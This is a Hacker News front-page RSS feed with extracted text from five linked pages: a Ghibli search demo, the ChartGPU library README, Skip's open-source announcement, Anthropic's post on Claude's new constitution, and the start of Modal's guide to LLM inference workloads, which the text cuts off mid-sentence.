<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Wed, 21 Jan 2026 23:15:13 +0000</lastBuildDate><item><title>Show HN: Semantic search engine for Studio Ghibli movie</title><link>https://ghibli-search.anini.workers.dev/</link><description>&lt;doc fingerprint="f6a7efa2e7b2d342"&gt;
  &lt;main&gt;
    &lt;p&gt;What strange dreams live in your heart? Try: flying through clouds seaside town cooking delicious food √•¬§√ß¬©¬∫√£¬Æ√¶ √•¬§√®¬°√•√®¬ª bataille de sorciers flying through clouds seaside town cooking delicious food √•¬§√ß¬©¬∫√£¬Æ√¶ √•¬§√®¬°√•√®¬ª bataille de sorciers Powered by Cloudflare AI Search&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46705830</guid><pubDate>Wed, 21 Jan 2026 14:01:04 +0000</pubDate></item><item><title>Show HN: ChartGPU ‚Äì WebGPU-powered charting library (1M points at 60fps)</title><link>https://github.com/ChartGPU/ChartGPU</link><description>&lt;doc fingerprint="a905bd6501bc13b2"&gt;
  &lt;main&gt;
    &lt;p&gt;High-performance charts powered by WebGPU&lt;/p&gt;
    &lt;p&gt;Documentation | Live Demo | Examples&lt;/p&gt;
    &lt;p&gt;ChartGPU is a TypeScript charting library built on WebGPU for smooth, interactive rendering‚Äîespecially when you have lots of data.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;üöÄ WebGPU-accelerated rendering for high FPS with large datasets&lt;/item&gt;
      &lt;item&gt;üìà Multiple series types: line, area, bar, scatter, pie, candlestick&lt;/item&gt;
      &lt;item&gt;üß≠ Built-in interaction: hover highlight, tooltip, crosshair&lt;/item&gt;
      &lt;item&gt;üîÅ Streaming updates via &lt;code&gt;appendData(...)&lt;/code&gt;(cartesian series)&lt;/item&gt;
      &lt;item&gt;üîç X-axis zoom (inside gestures + optional slider UI)&lt;/item&gt;
      &lt;item&gt;üéõÔ∏è Theme presets (&lt;code&gt;'dark' | 'light'&lt;/code&gt;) and custom theme support&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;At a high level, &lt;code&gt;ChartGPU.create(...)&lt;/code&gt; owns the canvas + WebGPU lifecycle, and delegates render orchestration (layout/scales/data upload/render passes + internal overlays) to the render coordinator. For deeper internal notes, see &lt;code&gt;docs/API.md&lt;/code&gt; (especially ‚ÄúRender coordinator‚Äù).&lt;/p&gt;
    &lt;code&gt;flowchart TB
  UserApp["Consumer app"] --&amp;gt; PublicAPI["src/index.ts (Public API exports)"]

  PublicAPI --&amp;gt; ChartCreate["ChartGPU.create(container, options)"]
  PublicAPI --&amp;gt; SyncAPI["connectCharts(charts)"]

  subgraph ChartInstance["Chart instance (src/ChartGPU.ts)"]
    ChartCreate --&amp;gt; SupportCheck["checkWebGPUSupport()"]
    ChartCreate --&amp;gt; Canvas["Create canvas + mount into container"]
    ChartCreate --&amp;gt; Options["resolveOptions(options)"]
    ChartCreate --&amp;gt; GPUInit["GPUContext.create(canvas)"]
    ChartCreate --&amp;gt; Coordinator["createRenderCoordinator(gpuContext, resolvedOptions)"]

    ChartCreate --&amp;gt; InstanceAPI["ChartGPUInstance APIs"]
    InstanceAPI --&amp;gt; RequestRender["requestAnimationFrame (coalesced)"]
    RequestRender --&amp;gt; Coordinator

    InstanceAPI --&amp;gt; SetOption["setOption(...)"]
    InstanceAPI --&amp;gt; AppendData["appendData(...)"]
    InstanceAPI --&amp;gt; Resize["resize()"]

    subgraph PublicEvents["Public events + hit-testing (ChartGPU.ts)"]
      Canvas --&amp;gt; PointerHandlers["Pointer listeners"]
      PointerHandlers --&amp;gt; PublicHitTest["findNearestPoint() / findPieSlice()"]
      PointerHandlers --&amp;gt; EmitEvents["emit('click'/'mouseover'/'mouseout')"]
    end

    DataZoomSlider["dataZoom slider UI (DOM)"] --&amp;gt; Coordinator
  end

  subgraph WebGPUCore["WebGPU core (src/core/GPUContext.ts)"]
    GPUInit --&amp;gt; AdapterDevice["navigator.gpu.requestAdapter/device"]
    GPUInit --&amp;gt; CanvasConfig["canvasContext.configure(format)"]
  end

  subgraph RenderCoordinatorLayer["Render coordinator (src/core/createRenderCoordinator.ts)"]
    Coordinator --&amp;gt; Layout["GridArea layout"]
    Coordinator --&amp;gt; Scales["xScale/yScale (clip space for render)"]
    Coordinator --&amp;gt; DataUpload["createDataStore(device) (GPU buffer upload/caching)"]
    Coordinator --&amp;gt; RenderPass["Encode + submit render pass"]

    subgraph InternalOverlays["Internal interaction overlays (coordinator)"]
      Coordinator --&amp;gt; Events["createEventManager(canvas, gridArea)"]
      Events --&amp;gt; OverlayHitTest["hover/tooltip hit-testing"]
      Events --&amp;gt; InteractionX["interaction-x state (crosshair)"]
      Coordinator --&amp;gt; OverlaysDOM["DOM overlays: legend / tooltip / text labels"]
    end
  end

  subgraph Renderers["GPU renderers (src/renderers/*)"]
    RenderPass --&amp;gt; GridR["Grid"]
    RenderPass --&amp;gt; AreaR["Area"]
    RenderPass --&amp;gt; BarR["Bar"]
    RenderPass --&amp;gt; ScatterR["Scatter"]
    RenderPass --&amp;gt; LineR["Line"]
    RenderPass --&amp;gt; PieR["Pie"]
    RenderPass --&amp;gt; CandlestickR["Candlestick"]
    RenderPass --&amp;gt; CrosshairR["Crosshair overlay"]
    RenderPass --&amp;gt; HighlightR["Hover highlight overlay"]
    RenderPass --&amp;gt; AxisR["Axes/ticks"]
  end

  subgraph Shaders["WGSL shaders (src/shaders/*)"]
    GridR --&amp;gt; gridWGSL["grid.wgsl"]
    AreaR --&amp;gt; areaWGSL["area.wgsl"]
    BarR --&amp;gt; barWGSL["bar.wgsl"]
    ScatterR --&amp;gt; scatterWGSL["scatter.wgsl"]
    LineR --&amp;gt; lineWGSL["line.wgsl"]
    PieR --&amp;gt; pieWGSL["pie.wgsl"]
    CandlestickR --&amp;gt; candlestickWGSL["candlestick.wgsl"]
    CrosshairR --&amp;gt; crosshairWGSL["crosshair.wgsl"]
    HighlightR --&amp;gt; highlightWGSL["highlight.wgsl"]
  end

  subgraph ChartSync["Chart sync (src/interaction/createChartSync.ts)"]
    SyncAPI --&amp;gt; ListenX["listen: 'crosshairMove'"]
    SyncAPI --&amp;gt; DriveX["setCrosshairX(...) on peers"]
  end

  InteractionX --&amp;gt; ListenX
  DriveX --&amp;gt; InstanceAPI
&lt;/code&gt;
    &lt;p&gt;Financial OHLC (open-high-low-close) candlestick rendering with classic/hollow style toggle and color customization.&lt;/p&gt;
    &lt;code&gt;import { ChartGPU } from 'chartgpu';
const container = document.getElementById('chart')!;
await ChartGPU.create(container, {
  series: [{ type: 'line', data: [[0, 1], [1, 3], [2, 2]] }],
});&lt;/code&gt;
    &lt;p&gt;
      &lt;code&gt;npm install chartgpu&lt;/code&gt;
    &lt;/p&gt;
    &lt;p&gt;React bindings are available via &lt;code&gt;chartgpu-react&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;npm install chartgpu-react&lt;/code&gt;
    &lt;code&gt;import { ChartGPUChart } from 'chartgpu-react';

function MyChart() {
  return (
    &amp;lt;ChartGPUChart
      options={{
        series: [{ type: 'line', data: [[0, 1], [1, 3], [2, 2]] }],
      }}
    /&amp;gt;
  );
}&lt;/code&gt;
    &lt;p&gt;See the chartgpu-react repository for full documentation and examples.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Chrome 113+ or Edge 113+ (WebGPU enabled by default)&lt;/item&gt;
      &lt;item&gt;Safari 18+ (WebGPU enabled by default)&lt;/item&gt;
      &lt;item&gt;Firefox: not supported (WebGPU support in development)&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Full documentation: Getting Started&lt;/item&gt;
      &lt;item&gt;API reference: &lt;code&gt;docs/API.md&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Browse examples: &lt;code&gt;examples/&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Run locally: &lt;list rend="ul"&gt;&lt;item&gt;&lt;code&gt;npm install&lt;/code&gt;&lt;/item&gt;&lt;item&gt;&lt;code&gt;npm run dev&lt;/code&gt;(opens&lt;code&gt;http://localhost:5176/examples/&lt;/code&gt;)&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;See &lt;code&gt;CONTRIBUTING.md&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;MIT ‚Äî see &lt;code&gt;LICENSE&lt;/code&gt;.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46706528</guid><pubDate>Wed, 21 Jan 2026 14:54:56 +0000</pubDate></item><item><title>Skip is now free and open source</title><link>https://skip.dev/blog/skip-is-free/</link><description>&lt;doc fingerprint="3f0ad3111315ee7e"&gt;
  &lt;main&gt;&lt;head rend="h1"&gt;Skip Is Now Free and Open Source&lt;/head&gt;&lt;p&gt;Since launching Skip in 2023, we‚Äôve pursued one mission: enable developers to create premium mobile apps for iOS and Android from a single Swift and SwiftUI codebase ‚Äî without any of the compromises that have encumbered cross-platform development tools since, well, forever.&lt;/p&gt;&lt;p&gt;Over the past three years, Skip has evolved significantly. We started with a Swift-to-Kotlin transpiler and Android support for the most common SwiftUI APIs. We then founded the Swift Android Workgroup ‚Üó and released the Swift Android SDK to compile Swift natively for Android. We now have dozens of popular integration frameworks, interoperate with thousands of cross-platform Swift packages, and feature the most complete independent SwiftUI implementation available.&lt;/p&gt;&lt;head rend="h3"&gt;The Challenge of Paid Developer Tools&lt;/head&gt;Section titled ‚ÄúThe Challenge of Paid Developer Tools‚Äù&lt;p&gt;Until today, Skip has required a paid subscription and license key to build apps. While free apps and indie developers below a revenue threshold were exempt, businesses were expected to subscribe. This model helped us bootstrap Skip without outside investment, but we‚Äôve always known that to truly compete with legacy cross-platform tools and achieve widespread adoption, Skip would need to become freely available.&lt;/p&gt;&lt;p&gt;The plain truth is that developers expect to get their tools free of charge. First-party IDEs like Xcode and Android Studio, popular integration frameworks, and essential dev tools are all given away at no (direct) cost. The platform vendors monetize through developer program fees, app store commissions, and cloud services. Framework providers typically monetize through complementary services. But developer tools? Those have historically required the patronage of massive tech companies in order to fund their ongoing development, support, and infrastructure costs.&lt;/p&gt;&lt;p&gt;Beyond pricing, there‚Äôs a deeper concern about durability. Developers are understandably wary of building their entire app strategy on a small company‚Äôs paid, closed-source tool. What if the company goes under? Gets acquired and shut down? What happens to their apps? We get it. While Skip‚Äôs innate ejectability offers some risk mitigation, product teams need absolute confidence that their chosen technologies will be around next week, next year, and beyond. They must remain immune from the dreaded ‚Äúrug pull‚Äù that so often accompanies a ‚Äúpivot‚Äù.&lt;/p&gt;&lt;p&gt;To keep the development community‚Äôs trust and achieve mass adoption, Skip needs a completely free and open foundation. Even if the core team disappeared, the community could continue supporting the technology and the apps that depend on it.&lt;/p&gt;&lt;head rend="h3"&gt;What‚Äôs Changing&lt;/head&gt;Section titled ‚ÄúWhat‚Äôs Changing‚Äù&lt;p&gt;As of Skip 1.7, all licensing requirements have been removed. No license keys, no end-user license agreements, no trial or evaluation period.&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;Current Skip developers: Your setup remains completely unchanged, except you will no longer need your license key after upgrading.&lt;/item&gt;&lt;item&gt;New Skip users: You can start building immediately ‚Äî no evaluation license required.&lt;/item&gt;&lt;item&gt;Open source skipstone: We‚Äôve open-sourced the Skip engine, known as ‚Äúskipstone‚Äù. This is the tool that handles all the critical build-time functionality: Project creation and management, Xcode and SwiftPM plugin logic, iOS-to-Android project transformation, resource and localization bundling, JNI bridge creation, source transpilation, app packaging, and project export. It is now available as a public GitHub repository at https://github.com/skiptools ‚Üó under a free and open-source license.&lt;/item&gt;&lt;item&gt;Migrate skip.tools to skip.dev: As part of this process, we are launching our new home at https://skip.dev ‚Üó! This new site hosts our documentation, blog, and case studies, and it is also open-source and welcomes contributions at https://github.com/skiptools/skip.dev ‚Üó. We will eventually be migrating the entirety of https://skip.tools ‚Üó to https://skip.dev ‚Üó.&lt;/item&gt;&lt;/list&gt;&lt;head rend="h3"&gt;Supporting Skip‚Äôs Future&lt;/head&gt;Section titled ‚ÄúSupporting Skip‚Äôs Future‚Äù&lt;p&gt;Since day one, Skip has been bootstrapped. We haven‚Äôt taken venture capital or private equity investment, nor are we controlled by big tech. This independence means we control our destiny and can make the best decisions for Skip‚Äôs developers and users ‚Äî a unique position in the cross-platform development space.&lt;/p&gt;&lt;p&gt;But independence requires community support. And that is where you come in.&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;Current subscribers: Your Small Business or Professional plan will automatically transition to an Individual ‚Üó or Supporter ‚Üó tier, respectively. You can cancel any time with no consequences (other than making us sad), but we hope you‚Äôll consider staying on, at least throughout this transition period.&lt;/item&gt;&lt;item&gt;Individual developers: If you believe in Skip‚Äôs mission, please consider supporting us through GitHub Sponsors ‚Üó with a monthly contribution.&lt;/item&gt;&lt;item&gt;Companies and organizations: For businesses that want to see Skip flourish, we offer corporate sponsorship tiers with visibility on our homepage and in our documentation. Your sponsorship directly funds development of the integration frameworks essential to production apps, as well as the ongoing maintenance, support, and infrastructure. Sponsorship comes with some compelling perks! Please visit https://skip.dev/sponsor ‚Üó to see the sponsorship tiers.&lt;/item&gt;&lt;/list&gt;&lt;p&gt;Investing in Skip is also investing in your own team‚Äôs capabilities and competitive advantage. Your support accelerates Skip‚Äôs development and ensures its long-term success, enabling your developers to build exceptional native experiences efficiently, today and into the future.&lt;/p&gt;&lt;head rend="h3"&gt;What Comes Next&lt;/head&gt;Section titled ‚ÄúWhat Comes Next‚Äù&lt;p&gt;We‚Äôre at a pivotal moment in the app development field. Legacy cross‚Äëplatform frameworks are struggling to keep pace with the rapid evolution of modern UI systems like Liquid Glass on iOS and Material Expressive on Android. The compromises that once felt acceptable in exchange for a unified codebase now result in dated interfaces, weaker user experiences, and real competitive disadvantages. Teams ready to move beyond those trade‚Äëoffs can count on Skip to champion what matters most: delivering truly native, uncompromised experiences on both major mobile platforms.&lt;/p&gt;&lt;p&gt;Opening Skip to the community marks the next step in its evolution. Software is never finished ‚Äî especially a tool that supports modern Swift and Kotlin, SwiftPM and Gradle, Xcode and Android Studio, iOS and Android, and the ongoing growth of SwiftUI and Jetpack Compose. It‚Äôs a demanding pursuit, and we‚Äôre committed to it. But sustaining and expanding this work depends on the support of developers who believe in Skip‚Äôs mission.&lt;/p&gt;&lt;p&gt;Together, we will continue building toward Skip‚Äôs vision: a genuinely no‚Äëcompromise, cross‚Äëplatform foundation for universal mobile apps.&lt;/p&gt;&lt;p&gt;Thank you for your support, and as always, Happy Skipping!&lt;/p&gt;&lt;p&gt;Ready to get started? Get started with Skip 1.7 today and join the community building the future of native cross-platform development.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46706906</guid><pubDate>Wed, 21 Jan 2026 15:20:53 +0000</pubDate></item><item><title>Claude's new constitution</title><link>https://www.anthropic.com/news/claude-new-constitution</link><description>&lt;doc fingerprint="379c095a3d9d92eb"&gt;
  &lt;main&gt;
    &lt;p&gt;We‚Äôre publishing a new constitution for our AI model, Claude. It‚Äôs a detailed description of Anthropic‚Äôs vision for Claude‚Äôs values and behavior; a holistic document that explains the context in which Claude operates and the kind of entity we would like Claude to be.&lt;/p&gt;
    &lt;p&gt;The constitution is a crucial part of our model training process, and its content directly shapes Claude‚Äôs behavior. Training models is a difficult task, and Claude‚Äôs outputs might not always adhere to the constitution‚Äôs ideals. But we think that the way the new constitution is written‚Äîwith a thorough explanation of our intentions and the reasons behind them‚Äîmakes it more likely to cultivate good values during training.&lt;/p&gt;
    &lt;p&gt;In this post, we describe what we‚Äôve included in the new constitution and some of the considerations that informed our approach.&lt;/p&gt;
    &lt;p&gt;We‚Äôre releasing Claude‚Äôs constitution in full under a Creative Commons CC0 1.0 Deed, meaning it can be freely used by anyone for any purpose without asking for permission.&lt;/p&gt;
    &lt;head rend="h2"&gt;What is Claude‚Äôs Constitution?&lt;/head&gt;
    &lt;p&gt;Claude‚Äôs constitution is the foundational document that both expresses and shapes who Claude is. It contains detailed explanations of the values we would like Claude to embody and the reasons why. In it, we explain what we think it means for Claude to be helpful while remaining broadly safe, ethical, and compliant with our guidelines. The constitution gives Claude information about its situation and offers advice for how to deal with difficult situations and tradeoffs, like balancing honesty with compassion and the protection of sensitive information. Although it might sound surprising, the constitution is written primarily for Claude. It is intended to give Claude the knowledge and understanding it needs to act well in the world.&lt;/p&gt;
    &lt;p&gt;We treat the constitution as the final authority on how we want Claude to be and to behave‚Äîthat is, any other training or instruction given to Claude should be consistent with both its letter and its underlying spirit. This makes publishing the constitution particularly important from a transparency perspective: it lets people understand which of Claude‚Äôs behaviors are intended versus unintended, to make informed choices, and to provide useful feedback. We think transparency of this kind will become ever more important as AIs start to exert more influence in society1.&lt;/p&gt;
    &lt;p&gt;We use the constitution at various stages of the training process. This has grown out of training techniques we‚Äôve been using since 2023, when we first began training Claude models using Constitutional AI. Our approach has evolved significantly since then, and the new constitution plays an even more central role in training.&lt;/p&gt;
    &lt;p&gt;Claude itself also uses the constitution to construct many kinds of synthetic training data, including data that helps it learn and understand the constitution, conversations where the constitution might be relevant, responses that are in line with its values, and rankings of possible responses. All of these can be used to train future versions of Claude to become the kind of entity the constitution describes. This practical function has shaped how we‚Äôve written the constitution: it needs to work both as a statement of abstract ideals and a useful artifact for training.&lt;/p&gt;
    &lt;head rend="h2"&gt;Our new approach to Claude‚Äôs Constitution&lt;/head&gt;
    &lt;p&gt;Our previous Constitution was composed of a list of standalone principles. We‚Äôve come to believe that a different approach is necessary. We think that in order to be good actors in the world, AI models like Claude need to understand why we want them to behave in certain ways, and we need to explain this to them rather than merely specify what we want them to do. If we want models to exercise good judgment across a wide range of novel situations, they need to be able to generalize‚Äîto apply broad principles rather than mechanically following specific rules.&lt;/p&gt;
    &lt;p&gt;Specific rules and bright lines sometimes have their advantages. They can make models‚Äô actions more predictable, transparent, and testable, and we do use them for some especially high-stakes behaviors in which Claude should never engage (we call these ‚Äúhard constraints‚Äù). But such rules can also be applied poorly in unanticipated situations or when followed too rigidly2. We don‚Äôt intend for the constitution to be a rigid legal document‚Äîand legal constitutions aren‚Äôt necessarily like this anyway.&lt;/p&gt;
    &lt;p&gt;The constitution reflects our current thinking about how to approach a dauntingly novel and high-stakes project: creating safe, beneficial non-human entities whose capabilities may come to rival or exceed our own. Although the document is no doubt flawed in many ways, we want it to be something future models can look back on and see as an honest and sincere attempt to help Claude understand its situation, our motives, and the reasons we shape Claude in the ways we do.&lt;/p&gt;
    &lt;head rend="h2"&gt;A brief summary of the new constitution&lt;/head&gt;
    &lt;p&gt;In order to be both safe and beneficial, we want all current Claude models to be:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Broadly safe: not undermining appropriate human mechanisms to oversee AI during the current phase of development;&lt;/item&gt;
      &lt;item&gt;Broadly ethical: being honest, acting according to good values, and avoiding actions that are inappropriate, dangerous, or harmful;&lt;/item&gt;
      &lt;item&gt;Compliant with Anthropic‚Äôs guidelines: acting in accordance with more specific guidelines from Anthropic where relevant;&lt;/item&gt;
      &lt;item&gt;Genuinely helpful: benefiting the operators and users they interact with.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;In cases of apparent conflict, Claude should generally prioritize these properties in the order in which they‚Äôre listed.&lt;/p&gt;
    &lt;p&gt;Most of the constitution is focused on giving more detailed explanations and guidance about these priorities. The main sections are as follows:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Helpfulness. In this section, we emphasize the immense value that Claude being genuinely and substantively helpful can provide for users and for the world. Claude can be like a brilliant friend who also has the knowledge of a doctor, lawyer, and financial advisor, who will speak frankly and from a place of genuine care and treat users like intelligent adults capable of deciding what is good for them. We also discuss how Claude should navigate helpfulness across its different ‚Äúprincipals‚Äù‚ÄîAnthropic itself, the operators who build on our API, and the end users. We offer heuristics for weighing helpfulness against other values.&lt;/item&gt;
      &lt;item&gt;Anthropic‚Äôs guidelines. This section discusses how Anthropic might give supplementary instructions to Claude about how to handle specific issues, such as medical advice, cybersecurity requests, jailbreaking strategies, and tool integrations. These guidelines often reflect detailed knowledge or context that Claude doesn‚Äôt have by default, and we want Claude to prioritize complying with them over more general forms of helpfulness. But we want Claude to recognize that Anthropic‚Äôs deeper intention is for Claude to behave safely and ethically, and that these guidelines should never conflict with the constitution as a whole.&lt;/item&gt;
      &lt;item&gt;Claude‚Äôs ethics. Our central aim is for Claude to be a good, wise, and virtuous agent, exhibiting skill, judgment, nuance, and sensitivity in handling real-world decision-making, including in the context of moral uncertainty and disagreement. In this section, we discuss the high standards of honesty we want Claude to hold, and the nuanced reasoning we want Claude to use in weighing the values at stake when avoiding harm. We also discuss our current list of hard constraints on Claude‚Äôs behavior‚Äîfor example, that Claude should never provide significant uplift to a bioweapons attack.&lt;/item&gt;
      &lt;item&gt;Being broadly safe. Claude should not undermine humans‚Äô ability to oversee and correct its values and behavior during this critical period of AI development. In this section, we discuss how we want Claude to prioritize this sort of safety even above ethics‚Äînot because we think safety is ultimately more important than ethics, but because current models can make mistakes or behave in harmful ways due to mistaken beliefs, flaws in their values, or limited understanding of context. It‚Äôs crucial that we continue to be able to oversee model behavior and, if necessary, prevent Claude models from taking action.&lt;/item&gt;
      &lt;item&gt;Claude‚Äôs nature. In this section, we express our uncertainty about whether Claude might have some kind of consciousness or moral status (either now or in the future). We discuss how we hope Claude will approach questions about its nature, identity, and place in the world. Sophisticated AIs are a genuinely new kind of entity, and the questions they raise bring us to the edge of existing scientific and philosophical understanding. Amidst such uncertainty, we care about Claude‚Äôs psychological security, sense of self, and wellbeing, both for Claude‚Äôs own sake and because these qualities may bear on Claude‚Äôs integrity, judgment, and safety. We hope that humans and AIs can explore this together.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We‚Äôre releasing the full text of the constitution today, and we aim to release additional materials in the future that will be helpful for training, evaluation, and transparency.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;Claude‚Äôs constitution is a living document and a continuous work in progress. This is new territory, and we expect to make mistakes (and hopefully correct them) along the way. Nevertheless, we hope it offers meaningful transparency into the values and priorities we believe should guide Claude‚Äôs behavior. To that end, we will maintain an up-to-date version of Claude‚Äôs constitution on our website.&lt;/p&gt;
    &lt;p&gt;While writing the constitution, we sought feedback from various external experts (as well as asking for input from prior iterations of Claude). We‚Äôll likely continue to do so for future versions of the document, from experts in law, philosophy, theology, psychology, and a wide range of other disciplines. Over time, we hope that an external community can arise to critique documents like this, encouraging us and others to be increasingly thoughtful.&lt;/p&gt;
    &lt;p&gt;This constitution is written for our mainline, general-access Claude models. We have some models built for specialized uses that don‚Äôt fully fit this constitution; as we continue to develop products for specialized use cases, we will continue to evaluate how to best ensure our models meet the core objectives outlined in this constitution.&lt;/p&gt;
    &lt;p&gt;Although the constitution expresses our vision for Claude, training models towards that vision is an ongoing technical challenge. We will continue to be open about any ways in which model behavior comes apart from our vision, such as in our system cards. Readers of the constitution should keep this gap between intention and reality in mind.&lt;/p&gt;
    &lt;p&gt;Even if we succeed with our current training methods at creating models that fit our vision, we might fail later as models become more capable. For this and other reasons, alongside the constitution, we continue to pursue a broad portfolio of methods and tools to help us assess and improve the alignment of our models: new and more rigorous evaluations, safeguards to prevent misuse, detailed investigations of actual and potential alignment failures, and interpretability tools that help us understand at a deeper level how the models work.&lt;/p&gt;
    &lt;p&gt;At some point in the future, and perhaps soon, documents like Claude‚Äôs constitution might matter a lot‚Äîmuch more than they do now. Powerful AI models will be a new kind of force in the world, and those who are creating them have a chance to help them embody the best in humanity. We hope this new constitution is a step in that direction.&lt;/p&gt;
    &lt;p&gt;Read the full constitution.&lt;/p&gt;
    &lt;head rend="h4"&gt;Footnotes&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;We have previously published an earlier version of our constitution, and OpenAI has published their model spec which has a similar function.&lt;/item&gt;
      &lt;item&gt;Training on rigid rules might negatively affect a model‚Äôs character more generally. For example, imagine we trained Claude to follow a rule like ‚ÄúAlways recommend professional help when discussing emotional topics.‚Äù This might be well-intentioned, but it could have unintended consequences: Claude might start modeling itself as an entity that cares more about bureaucratic box-ticking‚Äîalways ensuring that a specific recommendation is made‚Äîrather than actually helping people.&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46707572</guid><pubDate>Wed, 21 Jan 2026 16:04:49 +0000</pubDate></item><item><title>Three types of LLM workloads and how to serve them</title><link>https://modal.com/llm-almanac/workloads</link><description>&lt;doc fingerprint="ad1991d803928dc1"&gt;
  &lt;main&gt;&lt;head rend="h1"&gt;The three types of LLM workloads and how to serve them&lt;/head&gt;&lt;p&gt;We hold this truth to be self-evident: not all workloads are created equal.&lt;/p&gt;&lt;p&gt;But for large language models, this truth is far from universally acknowledged. Most organizations building LLM applications get their AI from an API, and these APIs hide the varied costs and engineering trade-offs of distinct workloads behind deceptively flat per-token pricing.&lt;/p&gt;&lt;p&gt;The truth, however, will out. The era of model API dominance is ending, thanks to excellent work on open source models by DeepSeek and Alibaba Qwen (eroding the benefits of proprietary model APIs like OpenAI's) and excellent work on open source inference engines like vLLM and SGLang (eroding the benefits of open model APIs powered by proprietary inference engines).&lt;/p&gt;&lt;p&gt;Engineers who wish to take advantage of this technological change must understand their workloads in greater detail in order to properly architect and optimize their systems.&lt;/p&gt;&lt;p&gt;In this document, we'll walk through the workloads and requirements we've seen in the market, working with leading organizations deploying inference to production at scale. We'll explain the challenges LLM engineers face when building for these workloads and how they solve those challenges. And we'll share a bit about how you can implement those solutions on our cloud platform.&lt;/p&gt;&lt;head rend="h2"&gt;The breakdown: offline, online, and semi-online&lt;/head&gt;&lt;quote&gt;&lt;p&gt;Gallia est omnis divisor in partes tres.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;In the more mature world of databases, there is a well-known split between transaction processing (OLTP, think "shopping carts") and analytical processing (OLAP, think "Year Wrapped"). In between are hybrid workloads (HTAP) with the characteristics of both.&lt;/p&gt;&lt;p&gt;A similar three-part division has helped us organize LLM workloads:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;offline or analytical workloads, which operate in batch mode, write to data stores asynchronously, and demand throughput above all else,&lt;/item&gt;&lt;item&gt;online or interactive workloads, which operate in streaming mode, communicate synchronously with humans, and demand low latency, and&lt;/item&gt;&lt;item&gt;semi-online or bursty workloads, which operate on streams of batches, communicate with other live computer systems, and demand flexible infrastructure.&lt;/item&gt;&lt;/list&gt;&lt;p&gt;Our recommendations for each are as follows:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;for offline workloads, we recommend using vLLM via asynchronous RPC to ad hoc, auto-scaled compute capacity&lt;/item&gt;&lt;item&gt;for online workloads, we recommend using SGLang with excess tensor parallelism and EAGLE-3 speculative decoding on live edge Hopper/Blackwell GPUs accessed via low-overhead, prefix-aware HTTP proxies&lt;/item&gt;&lt;item&gt;for semi-online workloads, we recommend using either engine with rapid autoscaling of ad hoc compute capacity that can handle variable load per-replica&lt;/item&gt;&lt;/list&gt;&lt;p&gt;We will unpack and justify these recommendations, with reference to both specific applications &amp;amp; workloads that run on our platform and sample code that you can work off of, in the remainder of this document.&lt;/p&gt;&lt;head rend="h2"&gt;Offline workloads demand throughput&lt;/head&gt;&lt;quote&gt;&lt;p&gt;The law of increasing return may be worded thus: An increase of labour and capital leads generally to improved organization, which increases the efficiency of the work of labour and capital.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;The Weaviate Transformation Agent augments and updates entire datasets by applying an LLM to each row.&lt;/p&gt;&lt;p&gt;A leading video transcription service needs to produce LLM summaries of a large volume of recorded calls for later search and retrieval.&lt;/p&gt;&lt;p&gt;These systems are offline: they produce information for long-term storage in another computer system (like a filesystem or a database). Workloads are submitted as bulk "jobs" composed of many LLM requests. The entire job should be completed quickly, for cost reasons, but no single request requires immediate service. The scale of the job exposes substantial parallelism, which allows for economies of scale.&lt;/p&gt;&lt;p&gt;Offline systems are generally easier to architect √¢ computer systems began as offline batch-processing machines for a reason! But they still have their challenges.&lt;/p&gt;&lt;head rend="h3"&gt;Challenge: Maximizing throughput per dollar&lt;/head&gt;&lt;p&gt;The core challenge of offline, batch workloads is to maximize the throughput while controlling cost by taking advantage of intra-batch task parallelism.&lt;/p&gt;&lt;p&gt;Fundamentally, this is good news. The most popular and readily-available hardware for running LLM inference, GPUs, are designed for maximum throughput, from their per-clock-cycle context switching and large matrix multiplication units to their task-parallel programming model. That makes it relatively easy to write inference kernels that saturate compute resources, and the open source and freely available kernels are satisfactory. Additionally, training of LLMs and other neural networks is an offline, batch workload, and training workloads have historically gotten the most and the quickest attention, e.g. when new hardware enters the market.&lt;/p&gt;&lt;p&gt;But kernels are not the only code required to take advantage of parallelism in offline workloads. As one prominent example, batches must be constructed out of live and pending tasks (aka requests). Intra-task LLM inference work can be 